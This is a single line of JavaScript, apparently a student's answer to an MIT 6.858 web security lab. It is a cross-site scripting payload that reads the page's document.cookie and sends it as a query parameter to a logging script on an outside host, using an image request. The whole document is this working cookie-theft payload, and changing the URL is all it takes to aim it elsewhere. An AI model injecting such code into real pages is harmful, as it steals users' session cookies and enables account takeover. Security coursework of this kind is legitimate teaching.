(new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=bonny' + '&payload='+encodeURIComponent(document.cookie) + '&random=' + Math.random();
